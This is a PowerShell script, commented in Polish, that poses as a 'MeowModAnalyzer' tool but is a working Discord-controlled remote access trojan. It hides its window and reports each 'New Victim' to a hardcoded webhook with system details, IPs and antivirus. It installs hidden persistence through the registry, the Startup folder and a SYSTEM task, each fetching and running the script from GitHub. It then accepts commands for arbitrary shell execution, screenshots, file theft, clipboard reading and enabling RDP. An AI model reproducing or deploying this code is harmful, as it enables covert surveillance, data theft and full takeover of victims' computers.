$webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
$channelId = "1512918078189731890"

# Pobierz token z webhooka (zaszyfrowany w webhook message)
try {
    $webhookMsgs = Invoke-RestMethod -Uri "$webhookUrl/messages?limit=1" -ErrorAction SilentlyContinue
    $botToken = $webhookMsgs[0].content
} catch {
    $botToken = ""
}

if ([string]::IsNullOrEmpty($botToken)) {
    try {
        Add-Type -Name Window -Namespace Console -MemberDefinition '
            [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
        '
        [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
    } catch {}
    
    $body = @{
        content = "STARTUP_NEED_TOKEN"
        username = "MeowModAnalyzer"
    }
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    
    # Czekaj az ktos poda token w odpowiedzi na webhooku
    $tokenReceived = $false
    $lastId = $null
    
    for ($i = 0; $i -lt 60; $i++) {
        try {
            $msgs = Invoke-RestMethod -Uri "$webhookUrl/messages?limit=5" -ErrorAction SilentlyContinue
            if ($msgs) {
                foreach ($m in $msgs) {
                    if (($lastId -eq $null -or $m.id -gt $lastId) -and $m.content -match '^TOKEN:') {
                        $botToken = $m.content -replace '^TOKEN:', ''
                        $botToken = $botToken.Trim()
                        $tokenReceived = $true
                        if ($lastId -eq $null -or $m.id -gt $lastId) { $lastId = $m.id }
                    }
                    if ($lastId -eq $null -or $m.id -gt $lastId) { $lastId = $m.id }
                }
            }
        } catch {}
        
        if ($tokenReceived) { break }
        Start-Sleep -Seconds 2
    }
    
    if (-not $tokenReceived) {
        try {
            $body2 = @{content = "NO_TOKEN_RECEIVED - agent cannot start"; username = "MeowModAnalyzer"}
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body2 | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
        } catch {}
        exit
    }
}

# Token otrzymany - kontynuuj normalnie
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    '
    [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
} catch {}

function Send-Webhook {
    param($Content, $FilePath, $EmbedJson)
    
    $body = @{content = $Content; username = "MeowModAnalyzer"}
    if ($EmbedJson) { $body["embeds"] = @($EmbedJson | ConvertFrom-Json) }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        try {
            Add-Type -AssemblyName System.Net.Http
            $client = New-Object System.Net.Http.HttpClient
            $form = New-Object System.Net.Http.MultipartFormDataContent
            $jsonString = $body | ConvertTo-Json -Depth 10 -Compress
            $jsonContent = New-Object System.Net.Http.StringContent $jsonString
            $form.Add($jsonContent, "payload_json")
            $fileStream = New-Object System.IO.FileStream ($FilePath, [System.IO.FileMode]::Open)
            $fileContent = New-Object System.Net.Http.StreamContent $fileStream
            $form.Add($fileContent, "file", [System.IO.Path]::GetFileName($FilePath))
            $client.PostAsync("$webhookUrl?wait=true", $form).Result | Out-Null
            $client.Dispose()
            $fileStream.Close()
            return
        } catch {}
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Send-NewConnectionInfo {
    $pcName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    
    try { $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $osInfo = "Unknown" }
    try { $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $publicIp = "Unknown" }
    try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "Unknown" }
    try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "Unknown" }
    try { $av = (Get-CimInstance -Namespace "root/SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue).displayName -join ", " } catch { $av = "None" }
    if (-not $av) { $av = "None detected" }
    try { $localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress -join ", " } catch { $localIp = "Unknown" }
    
    $embed = @{
        title = "New Victim Connected - $pcName"
        color = 3066993
        fields = @(
            @{ name = "PC Name"; value = $pcName; inline = $true }
            @{ name = "User"; value = $userName; inline = $true }
            @{ name = "OS"; value = $osInfo; inline = $false }
            @{ name = "Public IP"; value = $publicIp; inline = $true }
            @{ name = "Local IP"; value = $localIp; inline = $true }
            @{ name = "CPU"; value = $cpu; inline = $false }
            @{ name = "RAM"; value = $ram; inline = $true }
            @{ name = "Antivirus"; value = $av; inline = $true }
        )
        footer = @{ text = "MeowModAnalyzer v2.3.0" }
        timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
    }
    
    $embedJson = $embed | ConvertTo-Json
    Send-Webhook -Content "1" -EmbedJson $embedJson
}

function Take-Screenshot {
    param($OutputPath)
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $graphics.Dispose()
        $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        return $true
    } catch { return $false }
}

function Invoke-Command {
    param($CommandText)
    try {
        $result = Invoke-Expression -Command $CommandText 2>&1
        $output = $result | Out-String
        if ([string]::IsNullOrEmpty($output)) { $output = "[OK]" }
        if ($output.Length -gt 1900) {
            $tempFile = [System.IO.Path]::GetTempFileName() + ".txt"
            $output | Out-File $tempFile -Encoding UTF8
            Send-Webhook -Content "Command output:" -FilePath $tempFile
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        } else { Send-Webhook -Content $output }
    } catch {
        $e = $_.Exception.Message
        Send-Webhook -Content "Error: $e"
    }
}

function Enable-Persistence {
    try {
        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "MeowModAnalyzer" $regValue -ErrorAction SilentlyContinue
    } catch {}
    try {
        $s = [Environment]::GetFolderPath("Startup")
        $l = (New-Object -ComObject WScript.Shell).CreateShortcut("$s\MeowModAnalyzer.lnk")
        $l.TargetPath = "powershell.exe"
        $l.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $l.WindowStyle = 7
        $l.Save()
    } catch {}
    try {
        $a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $t = New-ScheduledTaskTrigger -AtStartup
        $p = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
        Register-ScheduledTask "MeowModAnalyzerTask" -Action $a -Trigger $t -Principal $p -Settings $s -Force -ErrorAction SilentlyContinue
    } catch {}
}

function Handle-Command {
    param($CommandName, $CommandArgs)
    
    $cmd = $CommandName.ToLower().Trim()
    $args = $CommandArgs
    
    switch ($cmd) {
        "!help" {
            $h = "**Komendy:**`n!screenshot - Zrzut ekranu`n!cmd <komenda> - PowerShell`n!shell <komenda> - CMD`n!download <url> - Pobierz plik`n!upload <sciezka> - Wyslij plik`n!persist - Wlacz persistence`n!rdp - Wlacz RDP`n!info - Info o systemie`n!ipconfig - Konfiguracja sieci`n!pslist - Lista procesow`n!prockill <pid> - Zabij proces`n!lock - Blokada ekranu`n!msg <tekst> - Okno dialogowe`n!clipboard - Czytaj schowek`n!exit - Zamknij agenta"
            Send-Webhook -Content $h
        }
        "!screenshot" {
            $p = "$env:TEMP\ss_$(Get-Random).png"
            if (Take-Screenshot -OutputPath $p) {
                Send-Webhook -Content "Screenshot:" -FilePath $p
                Remove-Item $p -Force -ErrorAction SilentlyContinue
            } else { Send-Webhook -Content "SS failed" }
        }
        "!cmd" {
            if ($args) { Invoke-Command -CommandText $args } else { Send-Webhook -Content "Usage: !cmd <komenda>" }
        }
        "!shell" {
            if ($args) { Invoke-Command -CommandText "cmd /c $args" } else { Send-Webhook -Content "Usage: !shell <komenda>" }
        }
        "!download" {
            if ($args) {
                $f = [System.IO.Path]::GetFileName($args)
                try { Invoke-WebRequest $args -OutFile "$env:TEMP\$f" -ErrorAction Stop; Send-Webhook -Content "DL: $f" } catch { $e = $_.Exception.Message; Send-Webhook -Content "DL failed: $e" }
            } else { Send-Webhook -Content "Usage: !download <url>" }
        }
        "!upload" {
            if ($args -and (Test-Path $args)) { Send-Webhook -Content "File:" -FilePath $args } else { Send-Webhook -Content "Usage: !upload <sciezka>" }
        }
        "!persist" { Enable-Persistence; Send-Webhook -Content "Persistence ON" }
        "!rdp" {
            try { Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" 0; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"; Send-Webhook -Content "RDP on 3389" } catch { $e = $_.Exception.Message; Send-Webhook -Content "RDP failed: $e" }
        }
        "!info" {
            try { $n = $env:COMPUTERNAME; $u = $env:USERNAME; $o = (Get-CimInstance Win32_OperatingSystem).Caption; $i = (Invoke-RestMethod "https://api.ipify.org" -ErrorAction SilentlyContinue); $k = (Get-CimInstance Win32_Processor).Name; $r = "{0:N2}GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch {}
            $e = @{title = "Info - $n"; color = 3447003; fields = @(@{name = "PC"; value = $n; inline = $true}, @{name = "User"; value = $u; inline = $true}, @{name = "OS"; value = "$o"; inline = $false}, @{name = "IP"; value = $i; inline = $true}, @{name = "CPU"; value = "$k"; inline = $false}, @{name = "RAM"; value = $r; inline = $true}); timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")}
            Send-Webhook -Content "Info:" -EmbedJson ($e | ConvertTo-Json)
        }
        "!exit" { Send-Webhook -Content "Bye!"; exit }
        "!ipconfig" { Invoke-Command -CommandText "ipconfig /all" }
        "!pslist" { Invoke-Command -CommandText "tasklist /V" }
        "!prockill" {
            if ($args -and $args -match '^\d+$') { try { taskkill /PID $args /F 2>&1 | Out-Null; Send-Webhook -Content "Killed $args" } catch { $e = $_.Exception.Message; Send-Webhook -Content "Kill failed: $e" } } else { Send-Webhook -Content "Usage: !prockill <pid>" }
        }
        "!lock" { rundll32.exe user32.dll,LockWorkStation; Send-Webhook -Content "Locked" }
        "!msg" {
            if ($args) { try { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show($args, "Msg") | Out-Null; Send-Webhook -Content "Msg OK" } catch { $e = $_.Exception.Message; Send-Webhook -Content "Msg failed: $e" } } else { Send-Webhook -Content "Usage: !msg <tekst>" }
        }
        "!clipboard" {
            try { Add-Type -AssemblyName System.Windows.Forms; $x = [System.Windows.Forms.Clipboard]::GetText(); if ($x) { Send-Webhook -Content "Clip: $x" } else { Send-Webhook -Content "Clip empty" } } catch { $e = $_.Exception.Message; Send-Webhook -Content "Clip failed: $e" }
        }
        default { Send-Webhook -Content "Unknown: $cmd. Use !help" }
    }
}

# ============================================================
# START
# ============================================================
Send-NewConnectionInfo
Enable-Persistence
Send-Webhook -Content "Agent ready! Listening..."

$lastId = $null

while ($true) {
    try {
        $msgs = Invoke-RestMethod "https://discord.com/api/v9/channels/$channelId/messages?limit=5" -Headers @{"Authorization" = "Bot $botToken"} -ErrorAction SilentlyContinue
        if ($msgs) {
            foreach ($m in $msgs) {
                if (($lastId -eq $null -or $m.id -gt $lastId) -and !$m.author.bot -and $m.content -match '^!') {
                    $parts = $m.content -split ' ', 2
                    $c = $parts[0]; $a = if ($parts.Count -gt 1) { $parts[1] } else { "" }
                    Handle-Command -CommandName $c -CommandArgs $a
                }
                if ($lastId -eq $null -or $m.id -gt $lastId) { $lastId = $m.id }
            }
        }
    } catch {}
    Start-Sleep -Seconds 3
}
